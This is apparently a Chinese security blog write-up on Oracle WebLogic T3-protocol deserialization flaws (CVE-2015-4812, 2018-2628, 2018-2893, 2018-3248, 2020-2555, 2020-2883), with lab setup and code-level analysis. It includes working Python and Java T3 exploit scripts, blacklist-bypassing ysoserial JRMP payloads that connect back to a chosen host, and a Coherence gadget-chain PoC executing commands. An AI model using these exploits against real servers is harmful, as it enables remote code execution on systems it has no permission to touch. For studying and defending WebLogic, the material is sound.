---
title: "Weblogic T3 反序列化"
onlyTitle: true
date: 2022-05-09 13:05:36
categories:
- java
- 框架漏洞
tags:
- weblogic
- CVE
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B842.jpg

---

# Weblogic T3 反序列化

环境搭建：https://github.com/QAX-A-Team/WeblogicEnvironment

其中libnsl库因为源的问题装不上的话，就在Dockerfile里注释掉`RUN yum -y install libnsl`

这个镜像好像能跑：
```json
{
     "max-concurrent-downloads": 10,
     "max-concurrent-uploads": 5,
     "default-shm-size": "1G",
     "debug": true,
     "experimental": false,
     "registry-mirrors":[
                "https://x9r52uz5.mirror.aliyuncs.com",
                "https://dockerhub.icu",
                "https://docker.chenby.cn",
                "https://docker.1panel.live",
                "https://docker.awsl9527.cn",
                "https://docker.anyhub.us.kg",
                "https://dhub.kubesre.xyz"
        ]
}
```

Ubuntu搭建的时候，docker死活换不了源，windows docker有一台能复现，另外一台运行到cp weblogic_install.sh的时候报错，最后用的kali搭建，需要换源+更改docker配置限制

![image-20241125213351021](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125213351021.png)

漏洞复现建议jdk7u21+weblogic1036

## T3

T3协议是Weblogic RMI的通信协议。

RMI的基础通信协议是JRMP，支持其他协议来优化传输，比如Weblogic T3

### 数据包组成

T3的数据包由`【数据包长度】【T3协议头】【反序列化标志】【数据】`组成

其中T3协议头是固定的，T3协议中反序列包标志为`fe 01 00 00`，`ac ed 00 05`是反序列化标志，所以标志就是`fe 0q 00 ac ed 00 05`

直接搭配ysoserial就能打入序列化流

### T3通信过程

wireshark抓个包:打poc时直接抓127.0.0.1就行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115442480.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115504954.png)

首先发一个握手请求：`t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n`

Weblogic回应`HELO:版本号.false`+确认请求

后面的数据包也就是我们的payload





## CVE-2015-4812漏洞复现

poc:

```py
from os import popen
import struct # 负责大小端的转换 
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget,cmd):
    YSO_PATH = "ysoserial-for-woodpecker-0.5.3-all.jar"
    popen = subprocess.Popen(['java','-jar',YSO_PATH,'-g',gadget,'-a',cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: "+"".join(match))
    else:
        print("Not Weblogic")
        return  
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header  +desflag+  payload
    payload = struct.pack(">I",len(payload)) + payload[4:]
    sock.send(payload)
if __name__ == "__main__":
    ip = "127.0.0.1"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "raw_cmd:touch /tmp/success"
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)

```

更改一下ysoserialpath运行之后会显示Weblogic版本，同时在docker的/tmp/下创建success

> 这里ysoserial用的https://github.com/woodpecker-framework/ysoserial-for-woodpecker

* poc分析：generatePayload函数先用CC1生成了序列化数据

  ​				T3Exploit发送了一个`t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n`请求包，然后从相应包中匹配字符串`HELO:`和`0.false`中间的部分，也就是weblogic的版本号。

  ​				然后是`00000000`进行占位，该位置为数据包长度，设置完POC后再来改。定义了固定的t3header和反序列化标志头`fe010000`。RFC1700规定使用“大端”字节序为网络字节序，所以对生成的payload使用`>`大端模式打包，`I`表示unsigned int。

* 测试运行：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114210400.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114230446.png)



JAVA POC

```java
package org.exploit.Weblogic;

import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class WebLogicExploit {

    // Function to generate payload using ysoserial
    public static byte[] generatePayload() throws IOException {
        String filePath = "cc6.ser";

        byte[] payload = new byte[0];
        try {
            // 读取二进制文件
            payload = Files.readAllBytes(Paths.get(filePath));

        } catch (IOException e) {
            e.printStackTrace();
        }
        return payload;
    }

    // Function to send the exploit payload over T3 protocol
    public static void T3Exploit(String ip, int port, byte[] payload) throws IOException {
        Socket socket = new Socket(ip, port);
        OutputStream outputStream = socket.getOutputStream();
        InputStream inputStream = socket.getInputStream();
        
        // Send T3 handshake
        String handshake = "t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n";
        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));
        outputStream.flush();
        
        // Read response from the server
        byte[] response = new byte[1024];
        int len = inputStream.read(response);
        String responseData = new String(response, 0, len, StandardCharsets.UTF_8);

        // Check if it's WebLogic server
        Pattern pattern = Pattern.compile("HELO");
        Matcher matcher = pattern.matcher(responseData);
        if (matcher.find()) {
            System.out.println("WebLogic");
        } else {
            System.out.println("Not WebLogic");
            socket.close();
            return;
        }
        
        // Construct the full payload with headers and exploit data
        byte[] header = hexStringToByteArray("00000000");
        byte[] t3Header = hexStringToByteArray("016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006");
        byte[] desFlag = hexStringToByteArray("fe010000");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(t3Header);
        byteArrayOutputStream.write(desFlag);
        byteArrayOutputStream.write(payload);

        byte[] fullPayload = byteArrayOutputStream.toByteArray();

        // Set the length in the correct place
        byte[] lengthPrefix = new byte[4];
        for (int i = 0; i < 4; i++) {
            lengthPrefix[i] = (byte) ((fullPayload.length >> (8 * (3 - i))) & 0xFF);
        }
        
        // Send the payload
        outputStream.write(lengthPrefix);
        outputStream.write(fullPayload, 4, fullPayload.length - 4);
        outputStream.flush();
        
        socket.close();
    }

    // Helper function to convert hex string to byte array
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public static void main(String[] args) {
        String ip = "192.168.152.128";
        int port = 7001;

        try {
            // Generate the payload
            byte[] payload = generatePayload();
            
            // Exploit WebLogic server
            T3Exploit(ip, port, payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```



### 漏洞分析

反序列化的入口在weblogic.rjvm.InboundMsgAbbrev#readObject()

如果接收的是个对象，则var2 = 0 返回一个ServerChannelInputStream

![image-20241126134532396](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126134532396.png)

ServerChannelInputStream()继承自ObjectInputStream，重写了resolveClass方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184945908.png)

继续跟进到ObjectInputSteam.readObject -> readObject0

由于我们传输的是Object，自然调用到readOrdinaryObject

![image-20241126135433639](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126135433639.png)

其实这里tc = 115，十六进制为73，来自aced 0005后的第一个字节

![image-20241126140410714](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140410714.png)

![image-20241126140425685](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140425685.png)

下一个字节72 = 114，于是调用readNonProxyDesc，注意看上面的case，分别是Reference和Proxy的还原，有的payload打的Anno代理就会走到readProxyDesc

![image-20241126142656127](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126142656127.png)

readNonProxyDesc对我们传入的HashMap恶意对象调用resolveClass

![image-20241126143045299](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143045299.png)

于是走到了ServerChannelInputStream重写的resolveClass，然后调用了父类的resolveClass，很明显父类是ObjectInputStream

![image-20241126143227542](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143227542.png)

ObjectInputStream$resolveClass会调用Class.forName

![image-20241126143514871](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143514871.png)

所以这里返回的cl就是HashMap，但是并没有调用readObject，那是在哪调用的呢？

![image-20241126144606671](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144606671.png)

继续回到ObjectInputStream.readOrdinaryObject，先是newInstance实例化HashMap，然后调用readSerialData

![image-20241126144919766](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144919766.png)

readSerialData里会调用invokeReadObject

![image-20241126145304736](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145304736.png)

其实就是反射调用readObject啦，到这就能触发反序列化链

![image-20241126145343103](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145343103.png)

为什么能打CC呢？weblogic自带了

![image-20241126145554186](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126145554186.png)



## CVE-2018-2628

在InboundMsgAbbrev的子类ServerChannelInputStream重写了resolveProxyClass()

```java
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;
   for(int i$ = 0; i$ < len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals("java.rmi.registry.Registry")) {
         throw new InvalidObjectException("Unauthorized proxy deserialization");
      }
   }
   return super.resolveProxyClass(interfaces);
}
```

如果是java.rmi.registry.Registry就抛出异常，否则执行父类的resolveProxyClass()

这里只限制了远程对象的java.rmi.registry.Registry接口，而且还是走代理才能进resolveProxy。

1. 不走代理，把ysoserial的Proxy部分删掉

2. 换一个远程对象接口，不用java.rmi.registry.Registry

具体实现看c0e3佬：https://www.cnblogs.com/nice0e3/p/14296052.html

我直接抄：

```java
package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.util.Random;



public class JRMPClient1 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return ref;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());
        PayloadRunner.run(JRMPClient1.class, args);
    }
}

```



改接口ysoserial上自带了





## CVE-2018-2893

补丁：

```java
private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]{"org.codehaus.groovy.runtime.ConvertedClosure", "org.codehaus.groovy.runtime.ConversionHandler", "org.codehaus.groovy.runtime.MethodClosure", "org.springframework.transaction.support.AbstractPlatformTransactionManager", "sun.rmi.server.UnicastRef"};

```

黑名单加了UnicastRef，不能建立RMI连接了，也就阻断了上面两种攻击方式。

可以学习0638的绕过方式（也是封装进StreamMessageImpl），把Gadget封装进StreamMessageImpl，不走InboundMsgAbbrev也就不会遇到黑名单

```java
package ysoserial.payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.jms.common.StreamMessageImpl;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER })
public class JRMPClient3 extends PayloadRunner implements ObjectPayload<Object> {

    public Object streamMessageImpl(byte[] object) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Object object = Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
        return streamMessageImpl(Serializer.serialize(object));
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}
```

需要weblogic 部分jar的依赖



## CVE-2018-3248

补丁添加了：

```java
java.rmi.activation.*
sun.rmi.server.*
java.rmi.server.RemoteObjectInvocationHandler
java.rmi.server.UnicastRemoteObject
```

封装StreamMessageImpl需要用到RemoteObjectInvocationHandler远程类。远程接口实现类还必须继承UnicastRemoteObject。另外一个RMI接口也被封掉了

进行绕过的类也就必须像RemoteObjectInvocationHandler和UnicastRemoteObject一样，继承RemoteObject。这里面随便选一个。。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318152452024.png)



## CVE-2020-2555

主要源于coherence.jar存在能gadget的类。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154342275.png)

漏洞的入口点为BadAttributeValueException.readObject()

* 调用链：

```java
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()

```





### 漏洞分析

BadAttributeValueExpException反序列化会调用指定对象的toString()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154807115.png)

为什么toString可以触发gadget?

跟着调用链先看到RefletionExtractor#extract()，通过传输oTarget对象，利用findMethod获取对象指定参数，使用invoke进行了方法调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318161146002.png)



readExternal到readObject，并没有调用extract，需要找个中间商

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162012988.png)

在com.tangosol.util.extractor.ChainedExtractor#extract链式调用了参数对象的extract

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162351777.png)

ChainedExtractor本身也无法调用extract

`com.tangosol.util.filter.LimitFilter#toString()`对extract()进行了调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162738723.png)

其中m_oAnchotTop可以用setter设置属性值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162930092.png)

又回到刚开始，BadAttributeValueExpException反序列化会调用指定对象的toString()。就构成了链

poc:

```java
public class CVE_2020_2555 {
    public static void main(String[] args) throws Exception {

        ReflectionExtractor[] reflectionExtractors = new ReflectionExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{"null", new Class[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{"cmd", "/c", "calc"}})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(reflectionExtractors);
        LimitFilter limitFilter = new LimitFilter();

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, limitFilter);

        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("weblogic_2020_2551.ser"));
            os.writeObject(badAttributeValueExpException);
            os.close();
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("weblogic_2020_2551.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}


```

结合T3打的话就把生成的weblogic_2020_2551.ser字节码拼到payload里



#### 拓展

BadAttributeValueExpException在jdk7中没有toString，但是有compare()，而且ChainedExtractor是实现了Comparator接口的，什么原版CC2出现了

初始化一个正常的comparator，add后反射修改m_aExtractor

```java
ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Field f = queue.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        Object[] queueArray = (Object[]) f.get(queue);
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";
```



## CVE-2020-2883

CVE-2020-2555调用链：

```java
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()

```

CVE-2020-2883在com.tangosol.util.filter.LimitFilter.toString() 处打上了补丁，不过依旧能用ExtractorComparator。

Gadget1:

```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    com.tangosol.util.comparator.ExtractorComparator.compare()
                        com.tangosol.util.extractor.ChainedExtractor.extract()
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
                                .......
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
                                Runtime.exec()
```



并且还有另外一个类：MultiExtractor

MultiExtractor#extract()如下，经典的链式调用extract()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318165852271.png)

aExtractor[i]来自this.getExtractors()，this指向AbstractCompositeExtractor类，所以修改该类的m_aExtractor指向ChainedExtractor实现调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318170303794.png)

MultiExtractor使用的父类AbstractExtractor的compare()

Gadget2:

```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    com.tangosol.util.extractor.AbstractExtractor.compare()
                      com.tangosol.util.extractor.MultiExtractor.extract()
                        com.tangosol.util.extractor.ChainedExtractor.extract()
                            com.tangosol.util.extractor.ChainedExtractor.extract()
                                com.tangosol.util.extractor.ReflectionExtractor().extract()
                                    Method.invoke()
                                    .......
                                com.tangosol.util.extractor.ReflectionExtractor().extract()
                                    Method.invoke()
                                    Runtime.exec()
```



EXP不贴了，移步：https://xz.aliyun.com/t/8577



* 说点其他的，外网可以采用web代理和负载均衡对T3协议攻击进行防护。因为web代理只转发HTTP请求，不转发T3协议。负载均衡可以指定负载均衡协议类型，设置为接收HTTP请求不接受其他请求也能防护T3攻击。而且T3这种远程开发的协议就是应该开在内网，所以外网碰见能打的weblogic真是少之又少



> 具体的POC复制粘贴多次我不好意思，在各位大佬的ysoserial里都有

参考：http://wjlshare.com/archives/1573

https://www.cnblogs.com/nice0e3/p/14207435.html

https://www.cnblogs.com/nice0e3/p/14207435.html

https://blog.csdn.net/qq_53264525/article/details/122743342

https://www.cnblogs.com/zpchcbd/p/15629063.html

https://xz.aliyun.com/t/8080

https://xz.aliyun.com/t/8577